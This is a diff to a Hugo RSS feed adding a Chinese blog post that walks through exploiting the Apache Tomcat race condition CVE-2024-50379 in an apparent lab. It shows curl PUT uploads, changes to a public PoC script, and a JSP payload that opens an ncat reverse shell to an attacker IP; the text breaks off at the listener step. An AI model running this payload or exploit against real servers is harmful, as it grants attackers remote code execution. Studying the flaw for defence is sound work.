@@ -7,7 +7,442 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Yerucrem</copyright>
-        <lastBuildDate>Tue, 15 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 17 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>CVE-2024-50379</title>
+        <link>https://Yerucrem.github.io/p/cve-2024-50379/</link>
+        <pubDate>Thu, 17 Apr 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/cve-2024-50379/</guid>
+        <description>&lt;h1 id=&#34;tomcat-cve-2024-50379&#34;&gt;Tomcat: CVE-2024-50379
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;p&gt;Apache Tomcat 是一个开源 Web 服务器和 Servlet 容器 。 &lt;strong&gt;Servlet&lt;/strong&gt; 是一个 Java 类，它被创建在应用服务器上运行并处理客户端请求。它接收客户端的 HTTP 请求，进行处理，并生成正确的响应。Servlet &lt;strong&gt;容器&lt;/strong&gt;为 Java Servlet 提供运行时环境并管理它们的生命周期。&lt;/p&gt;
+&lt;p&gt;该漏洞影响以下版本的 Apache Tomcat：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Apache Tomcat 11.0.0-M1 至 11.0.1（在 11.0.2 或更高版本中修复）&lt;/li&gt;
+&lt;li&gt;Apache Tomcat 10.1.0-M1 to 10.1.33 (Fixed in 10.1.34 or later)&lt;/li&gt;
+&lt;li&gt;Apache Tomcat 9.0.0.M1 to 9.0.97 (Fixed in 9.0.98 or later)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;CVE -2024-50379 是一个检查时使用时 Time-of-check Time-of-use(TOCTOU) 漏洞的例子。TOCTOU  漏洞源于检查资源和使用资源之间的竞争条件。换句话说，系统在检查资源状态之后、使用资源之前，资源发生了变化，系统最终停止使用已更改的资源。在此漏洞中，TOCTOU 竞争条件发生在不区分大小写的系统上的 JSP（Java 服务器页面）编译期间，前提是默认 servlet 具有写入权限。&lt;/p&gt;
+&lt;h2 id=&#34;技术背景分析&#34;&gt;技术背景分析
+&lt;/h2&gt;&lt;p&gt;在易受攻击的服务器上利用该漏洞主要有两个条件：&lt;/p&gt;
+&lt;p&gt;首先，服务器允许用户&lt;strong&gt;上传和删除文件&lt;/strong&gt;，也就是说，服务器配置为接受 HTTP 命令，例如 PUT 和 DELETE。通过在 &lt;code&gt;web.xml&lt;/code&gt; 配置文件中将 &lt;code&gt;readonly&lt;/code&gt; 设置为 &lt;code&gt;false&lt;/code&gt; 来启用写入功能。注意，默认配置为 readonly。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;readonly&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;下面是一个不安全配置的示例，其中应用程序服务器设置为默认允许写入。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;default&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;org.apache.catalina.servlets.DefaultServlet&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;debug&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;listings&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;readonly&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;load-on-startup&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/load-on-startup&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;利用此漏洞的第二个条件是 Tomcat 运行在不区分大小写的系统上，例如 MS Windows 或 macOS。当满足这两个条件时，利用此漏洞就变成了与操作系统赛跑。&lt;/p&gt;
+&lt;p&gt;在 Linux 等区分大小写的系统上， &lt;code&gt;demo.jsp&lt;/code&gt; 和 &lt;code&gt;demo.Jsp&lt;/code&gt; 是两个不同的文件。因此，在 Linux 系统上， &lt;code&gt;documents&lt;/code&gt; 和 &lt;code&gt;Documents&lt;/code&gt; 共存于同一目录中并非不可能。&lt;/p&gt;
+&lt;p&gt;由于微软 Windows 系统不区分大小写，因此 &lt;code&gt;demo.jsp&lt;/code&gt; 和 &lt;code&gt;demo.Jsp&lt;/code&gt; 不可能是两个不同的文件；然而，对于 Tomcat 来说，前者是一个可以执行的 Servlet，而后者则被视为文本文件。换句话说，微软 Windows 对待 &lt;code&gt;demo.Jsp&lt;/code&gt; 和正确命名为 &lt;code&gt;demo.jsp&lt;/code&gt; Servlet 没有任何区别；Tomcat 的大小写检查会阻止 &lt;code&gt;demo.Jsp&lt;/code&gt; 被执行，从而避免将其视为可执行文件。&lt;/p&gt;
+&lt;p&gt;例如，如果我们尝试创建文件 &lt;code&gt;demo.jsp&lt;/code&gt; ，使用 &lt;code&gt;curl -X PUT -d &amp;quot;test&amp;quot; http://10.10.211.24:8080/demo.jsp&lt;/code&gt; 将会产生错误。由于 Servlet 可以在服务器端执行命令，因此出现此错误是意料之中的；因此，允许用户上传 &lt;code&gt;.jsp&lt;/code&gt; 文件会赋予他们远程代码执行 ( RCE ) 的能力。在下面的终端中，我们看到一个示例错误。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl -X PUT -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; http://10.10.211.24:8080/demo.jsp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP Status &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; – Not Found&amp;lt;/title&amp;gt;&amp;lt;style &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&amp;gt;body &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h1, h2, h3, b &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color:white&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h1 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:22px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h2 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:16px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:14px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color:black&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; .line &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;height:1px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;border:none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;HTTP Status &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; – Not Found&amp;lt;/h1&amp;gt;&amp;lt;hr &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;line&amp;#34;&lt;/span&gt; /&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt; Status Report&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Message&amp;lt;/b&amp;gt; JSP file &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#47;demo.jsp] not found&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Description&amp;lt;/b&amp;gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&amp;lt;/p&amp;gt;&amp;lt;hr class=&amp;#34;line&amp;#34; /&amp;gt;&amp;lt;h3&amp;gt;Apache Tomcat/10.1.30&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;让我们创建一个扩展名为 &lt;code&gt;Jsp&lt;/code&gt; 或 &lt;code&gt;JSP&lt;/code&gt; 的文件。此步骤应该可以成功，因为 Tomcat 不会将此类扩展名视为可执行文件。我们可以看到 &lt;code&gt;demo.Jsp&lt;/code&gt; 文件已在服务器上成功创建。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl -X PUT -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; http://10.10.211.24:8080/demo.Jsp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl http://10.10.211.24:8080/demo.Jsp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果我们尝试访问 &lt;code&gt;demo.Jsp&lt;/code&gt; ，在不区分大小写的系统中，它与 &lt;code&gt;demo.jsp&lt;/code&gt; 没有什么不同，但 Tomcat 会区分大小写，检查扩展名并将其视为文本文件。结果表明，当服务器负载过重时，可能会出现竞争条件。 &lt;code&gt;demo.Jsp&lt;/code&gt; 可能会被编译并作为 servlet 执行。由于系统不区分大小写，因此对 servlet 扩展名（如 &lt;code&gt;Jsp&lt;/code&gt; 和 &lt;code&gt;JSP&lt;/code&gt; ）的约束已经从操作系统转移到应用服务器。换句话说，当系统负载过重，并且同时读写同一个文件时，大小写检查可能会被绕过，导致上传的文件被作为 servlet 执行。&lt;/p&gt;
+&lt;p&gt;本次使用的tomcat版本为：10.1.25&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;不知道为什么，使用nmap -sV扫描扫不出版本。使用curl查看页面可以看到tomcat版本&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417144624821.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250417144624821&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;了解了几个PoC，其中一个如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/iSee857/CVE-2024-50379-PoC
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们将对该脚本进行两处更改：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;修改循环计数器&lt;/strong&gt; ：在指定实验环境中，我们注意到将四个请求中的每一个重复 2000 次而不是 10000 次效率更高。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;更改有效载荷&lt;/strong&gt; ：为了进行更有趣的利用，我们将使用反向 shell，而不是在目标系统上启动计算器。&lt;/p&gt;
+&lt;h3 id=&#34;修改循环计数器&#34;&gt;修改循环计数器
+&lt;/h3&gt;&lt;p&gt;原始 PoC 代码在第 43 行重复了 10000 次 &lt;code&gt;for&lt;/code&gt; 循环。为了获得更高效的结果，将次数降低到 2000。更新后的行如下所示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;futures&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 循环执行10000次&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# for _ in range(10000):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;更改有效载荷&#34;&gt;更改有效载荷
+&lt;/h3&gt;&lt;p&gt;此 PoC 漏洞利用使用了一个打开 &lt;code&gt;calc.exe&lt;/code&gt; Payload，可以从第 37 行推断出来。为了简化此漏洞利用，我们在 MS Windows 服务器上安装了 &lt;code&gt;ncat&lt;/code&gt; 。因此，我们将用另一个连接到攻击者系统的 Payload 替换该 Payload。注释掉的 Payload 和新的 Payload 如下所示。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# payload_put = &amp;#34;aa&amp;lt;% Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;);%&amp;gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload_put&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;%@ page import=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;java.io.*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; %&amp;gt;&amp;lt;% Runtime.getRuntime().exec(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cmd /c start ncat -e cmd.exe 10.10.241.219 8888&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;); %&amp;gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此有效载荷使用 JSP 的 &lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt; 来执行 &lt;code&gt;cmd /c start ncat -e cmd.exe 10.10.241.219 8888&lt;/code&gt; 。如上所述，这是可能的，因为我们为了演示目的安装了 &lt;code&gt;ncat&lt;/code&gt; 。&lt;/p&gt;
+&lt;h3 id=&#34;开始&#34;&gt;开始
+&lt;/h3&gt;&lt;p&gt;在运行此 PoC 之前，我们需要监听传入的连接。让我们使用 &lt;code&gt;netcat -lvnp 8888&lt;/code&gt; 在 攻击机上启动 &lt;code&gt;netcat&lt;/code&gt; 。&lt;/p&gt;
